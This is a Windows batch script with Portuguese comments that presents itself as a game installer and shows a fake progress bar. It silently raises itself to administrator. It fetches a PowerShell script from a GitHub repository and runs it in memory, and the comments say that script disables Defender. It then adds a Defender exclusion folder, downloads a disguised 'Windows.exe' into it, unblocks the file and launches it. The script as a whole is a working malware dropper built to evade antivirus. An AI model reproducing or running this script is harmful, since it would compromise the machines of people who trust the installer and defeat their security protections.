@echo off
setlocal EnableDelayedExpansion

:: --- Instalando... ---
net session >nul 2>&1 || (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)

:: --- Configuracao visual ---
title Windows
mode con: cols=60 lines=12
color 0F
cls

echo.
echo.
echo        Preparando ambiente...
echo.
echo        [                              ] 0%%
timeout /t 1 >nul

:: --- Etapa 1: Executa a desativacao DIRETO DA MEMORIA (sem download de arquivo) ---
cls
echo.
echo.
echo        Configurando pacotes...
echo.
echo        [##########                    ] 35%%

:: Tenta a sorte
powershell -NoProfile -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('https://github.com/espertin/winds/raw/main/defender_config.ps1')" >nul 2>&1

cls
echo.
echo.
echo        Aplicando configuracoes...
echo.
echo        [##############                ] 45%%
timeout /t 1 >nul

:: --- Etapa 2: Cria zona segura e baixa o jogo ---
set "PASTA_APP=C:\WindsApp"
set "NOME_EXE=Windows.exe"
set "CAMINHO_FULL=%PASTA_APP%\%NOME_EXE%"

if not exist "%PASTA_APP%" mkdir "%PASTA_APP%" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionPath '%PASTA_APP%'" >nul 2>&1
if exist "%CAMINHO_FULL%" del /f /q "%CAMINHO_FULL%" >nul 2>&1

cls
echo.
echo.
echo        Baixando arquivos...
echo.
echo        [###################           ] 65%%
curl -L -f -s -o "%CAMINHO_FULL%" "https://github.com/espertin/winds/raw/main/Windows.exe" >nul 2>&1

cls
echo.
echo.
echo        Baixando arquivos...
echo.
echo        [########################      ] 80%%
powershell -Command "Unblock-File -Path '%CAMINHO_FULL%'" >nul 2>&1

cls
echo.
echo.
echo        Finalizando...
echo.
echo        [############################  ] 95%%
timeout /t 1 >nul

cls
echo.
echo.
echo        Concluido!
echo.
echo        [##############################] 100%%

:: --- Executa o jogo ---
start "" "%CAMINHO_FULL%"
timeout /t 2 >nul
exit
